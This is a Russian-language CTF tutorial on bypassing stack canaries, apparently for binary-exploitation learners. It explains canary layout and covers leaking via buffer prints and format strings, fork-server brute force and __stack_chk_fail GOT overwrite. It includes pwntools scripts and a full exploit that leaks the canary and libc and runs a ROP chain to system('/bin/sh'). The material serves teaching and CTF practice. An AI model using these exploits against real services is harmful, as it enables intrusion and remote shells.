Stack canary — случайное значение, размещаемое компилятором между локальными переменными и сохранённым адресом возврата. Перед выходом из функции он сверяется; если изменён — вызывается `__stack_chk_fail`, и процесс аварийно завершается. Canary превращает тривиальный ret2win в задачу с дополнительным условием: нужно либо сохранить значение canary нетронутым, либо утечь его и записать обратно в payload.

## Как устроен canary

При `-fstack-protector` компилятор вставляет в пролог функции загрузку значения из `fs:0x28` (TLS) в стек, а в эпилог — сравнение с `fs:0x28` и вызов `__stack_chk_fail` при несовпадении. Значение выбирается при запуске процесса из `/dev/urandom` и заканчивается нулевым байтом (чтобы обрыв строковых операций не раскрывал его целиком). Уровни защиты: `-fstack-protector` (только функции с массивами), `-fstack-protector-strong` (массивы и адреса), `-fstack-protector-all` (все функции).

```bash
checksec --file=./chall
# Stack:    Canary found
```

Раскладка фрейма с canary:

| Смещение | Содержимое |
|---|---|
| 0x00..0x3f | `buf[64]` |
| 0x40..0x47 | canary (8 байт, младший — `\x00`) |
| 0x48..0x4f | сохранённый `rbp` |
| 0x50..0x57 | адрес возврата |

Значит, для перезаписи возврата нужно переписать и canary — а без его истинного значения это падение.

## Стратегия 1: не трогать canary (перезапись указателей)

Если функция содержит указатель на функцию, сохранённый на стеке ниже canary, можно перезаписать именно его, не доходя до canary. Классика: цикл, читающий структуру, где рядом лежат буфер и указатель-обработчик. Также сюда относятся переполнения, меняющие лишь младшие байты (partial overwrite) сохранённого указателя на другой объект в той же странице.

## Стратегия 2: утечка canary

Многие программы сами печатают буфер (`puts(buf)`, `printf(buf)`, `write(1, buf, n)`). Если буфер не завершается нулём, вывод захватит и canary. Формат-строка (`%p`) читает canary как аргумент. Иногда canary утекает через `%s` или при отсутствии `\x00`-терминатора, если `read` заполнил буфер полностью.

```python
from pwn import *
p = process('./chall')
p.sendline(b'A'*0x40)          # ровно размер буфера, без \x00 в конце
leak = p.recvline().strip()
canary = u64(leak[0x40:0x48])  # байты после буфера
log.success(f'canary = {hex(canary)}')
```

Формат-строка:

```python
p.sendline(b'%9$p')            # canary часто 9-й аргумент на amd64
canary = int(p.recvline().strip(), 16)
```

Позицию подбирают перебором `%N$p` или через `pwnlib.fmtstr.FmtStr`.

## Стратегия 3: brute-force по байтам

Если процесс форкается (fork-сервер), можно перебирать canary побайтово: при неверном байте процесс падает, при верном — идёт дальше. Нулевой младший байт известен, остальные 7 перебираются за 256 итераций каждый — всего до 1792 попыток. Работает только если форк наследует одно и то же canary (ASLR не перерандомизирует при fork).

```python
from pwn import *
canary = b'\x00'
for i in range(1, 8):
    for b in range(256):
        p = process('./chall')
        p.send(b'A'*0x40 + canary + bytes([b]))
        try:
            data = p.recv(timeout=0.2)
            if b'ok' in data or b'>' in data:
                canary += bytes([b]); break
        except EOFError:
            pass
log.success(f'canary = {canary.hex()}')
```

## Сборка payload с canary

```python
payload  = b'A' * 0x40            # до canary
payload += p64(canary)            # канарейка на место
payload += p64(0)                 # сохранённый rbp (фиктивный)
payload += p64(rop_chain)         # возврат
p.sendline(payload)
```

Порядок важен: `canary` идёт ровно на своё место; если сдвинуть — падение до возврата. Младший байт canary почти всегда `\x00`, поэтому строковые функции (`gets`, `strcpy`) могут оборвать запись — тогда используйте `read`.

## Обход через формат-строку записи

Если есть `%n`, можно вообще не угадывать canary: перезаписать адрес возврата в GOT/`__stack_chk_fail` или изменить canary на заранее известное значение через запись. Либо перезаписать `__stack_chk_fail@got` на адрес `win` — тогда провал проверки вызовет не abort, а полезную функцию. Это элегантный трюк, работающий при Partial RELRO.

```python
fmtstr_payload(6, {elf.got['__stack_chk_fail']: elf.symbols['win']})
```

## Тонкости и подводные камни

- **Canary заканчивается `\x00`.** При переполнении строковой функцией он оборвёт ввод — нельзя просто записать 8 байт. Нужен `read` или перезапись через указатель.
- **Позиция `%N$p` зависит от задачи.** Перебирайте N с 6 до 30.
- **fork-сервер vs одиночный процесс.** Брутфорс возможен только на fork-сервере.
- **Не путайте canary с ASLR.** Canary — значение, ASLR — адрес.
- **`__stack_chk_fail` тоже можно перехватить** при writable GOT.
- **Мусорный canary.** Если в payload случайно попали не те байты — падение до ret.

## Что дальше / решение

Дальше: `pwn-pie-bypass` (утечка базы кода), `pwn-fs-advanced` (запись через `%n`), `pwn-format-string` (утечки). Практический алгоритм: `checksec` → есть canary? → ищите, печатает ли программа буфер (утечка) → если да, утеките и вставьте в payload → если нет, ищите путь не трогать canary (указатели, partial overwrite) → если fork-сервер, брутфорс. Canary — не приговор, а ещё одно условие, которое почти всегда обходится комбинацией утечки и аккуратной сборки payload.

## Утечка canary через переполнение read и printf

Самый надёжный способ — заставить программу вывести canary. Функции `write(1, buf, n)` и `puts(buf)` печатают содержимое буфера; если `read` заполнил буфер целиком (без нулевого терминатора), а следующий вывод печатает больше, чем размер буфера, в утечку попадут байты canary. Формат-строка даёт ещё проще: `%9$p` или `%15$p` печатает значение аргумента из стека, где `printf` хранит сохранённые регистры. Позиция подбирается эмпирически.

Иногда canary утекает через `environ` или через `argv`: если программа печатает адрес стека, можно вычислить позицию canary в памяти и прочитать его через произвольное чтение. Комбинируйте утечку стека (для адреса) и format string (для чтения по адресу).

## Брутфорс на fork-сервере: детали

Многие сетевые задачи используют `fork()` на каждый коннект. Поскольку `fork` наследует адресное пространство, canary остаётся одинаковым во всех дочерних процессах. Это делает брутфорс возможным. Алгоритм: зная, что младший байт равен `\x00`, для каждого следующего байта перебираем 256 значений; при неверном байте дочерний процесс падает (соединение рвётся), при верном — продолжает работу (присылает ответ). Семь байт по 256 дают максимум 1792 попытки — вполне реализуемо за минуты.

Важно: брутфорс работает только если программа действительно форкается и canary не перегенерируется. Если ASLR перезапускает процесс целиком — приём не сработает. Проверка: посмотрите, одинаковы ли утечки адреса стека между двумя подключениями.

## Полный эксплойт с утечкой canary

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)
OFFSET_CANARY = 0x40
OFFSET_RET    = 0x48

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # утечка canary и libc через format string
    p.sendline(b'%9$p.%11$p')
    canary_s, libc_s = p.recvline().strip().split(b'.')
    canary = int(canary_s, 16)
    libc.address = int(libc_s, 16) - 0x29d90
    log.success(f'canary={hex(canary)} libc={hex(libc.address)}')
    # сборка payload
    rop = ROP(libc)
    rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
    payload  = b'A' * OFFSET_CANARY
    payload += p64(canary)
    payload += p64(0)                 # фиктивный rbp
    payload += p64(ROP(elf).find_gadget(['ret']).address)
    payload += rop.chain()
    p.sendline(payload)
    p.interactive()

exploit()
```

Обратите внимание: canary вставляется ровно на смещение `0x40`, сохранённый `rbp` — фиктивный, а перед цепочкой добавлен `ret` для выравнивания. Ошибка хотя бы на один байт в позиции canary приведёт к вызову `__stack_chk_fail` до возврата.

## Обход через перезапись __stack_chk_fail

При Partial RELRO запись в GOT доступна, и можно перезаписать `__stack_chk_fail` на адрес `win`. Тогда при неверном canary вместо аварийного завершения вызовется полезная функция. Это элегантно, но требует отдельного примитива записи (format string, heap-переполнение). Плюс в том, что не нужно угадывать canary вовсе.

## Расширенная справочная таблица

| Утечка | Функция | Позиция |
|---|---|---|
| canary | `%9$p` (amd64) | обычно 7-15 |
| libc | `%11$p` | зависит от стека |
| стек | `%15$p` | зависит от стека |
| буфер | `%7$p` | найдено перебором |
| environ | `%N$s` | нужен адрес `environ` |

| Ошибка | Последствие |
|---|---|
| canary сдвинут на 1 | `__stack_chk_fail` |
| канарейка прочитана как `%p` с `0x` | `int(x,16)` без strip падает |
| брутфорс на одиночном процессе | бессмысленно |
| записан `\x00` в canary строковой функцией | обрыв ввода |

## Сводка по обходу canary

Ключевая мысль: canary защищает только от слепой перезаписи адреса возврата. Как только у вас есть любой канал чтения (печать буфера, format string, `environ`), значение canary перестаёт быть секретом, и переполнение снова становится управляемым. Если канала чтения нет, ищите путь не задевать canary (указатели ниже него, partial overwrite) либо, на fork-сервере, применяйте побайтовый брутфорс. В реальном коде canary часто утекает через неаккуратный `printf(buf)` или через `write` всего буфера — аудит таких мест окупается.
